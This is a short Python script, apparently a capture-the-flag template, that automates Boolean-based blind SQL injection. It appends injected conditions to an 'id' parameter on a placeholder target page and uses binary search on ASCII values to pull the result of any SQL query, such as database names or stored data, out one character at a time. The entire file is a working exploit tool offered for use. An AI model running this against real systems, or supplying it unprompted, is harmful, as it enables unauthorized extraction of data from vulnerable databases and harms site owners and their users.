#!/usr/bin/env python3
"""
blind_sqli.py - A template for Boolean-based blind SQL injection using binary search.
Modify the check_truth() function to fit the target challenge.
"""
import requests
import sys

# Target configuration
URL = "http://target.local/vuln_page.php"
TRUE_STRING = "User exists" # String indicating the query returned TRUE

def check_truth(payload):
    # This is the injection point. Modify as needed (e.g. GET params, POST data, Cookies)
    params = {"id": f"1' AND ({payload})-- -"}
    try:
        r = requests.get(URL, params=params, timeout=3)
        return TRUE_STRING in r.text
    except requests.exceptions.RequestException:
        # On timeout/error, assume false or retry
        return False

def extract_character(query, position):
    # Binary search for ASCII values (32 to 126)
    low = 32
    high = 126
    
    while low <= high:
        mid = (low + high) // 2
        # Check if ASCII value at position is greater than mid
        payload = f"ASCII(SUBSTRING(({query}),{position},1))>{mid}"
        
        if check_truth(payload):
            low = mid + 1
        else:
            high = mid - 1
            
    # Verification
    payload_verify = f"ASCII(SUBSTRING(({query}),{position},1))={low}"
    if check_truth(payload_verify):
        return chr(low)
    return None

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <sql_query>")
        print(f"Example: {sys.argv[0]} 'SELECT database()'")
        return
        
    query = sys.argv[1]
    extracted = ""
    position = 1
    
    print(f"[*] Extracting query: {query}")
    print("[*] Result: ", end="", flush=True)
    
    while True:
        c = extract_character(query, position)
        if not c or ord(c) == 0: # Hit the end of the string
            break
        extracted += c
        print(c, end="", flush=True)
        position += 1
        
    print(f"\n[+] Final extracted value: {extracted}")

if __name__ == "__main__":
    main()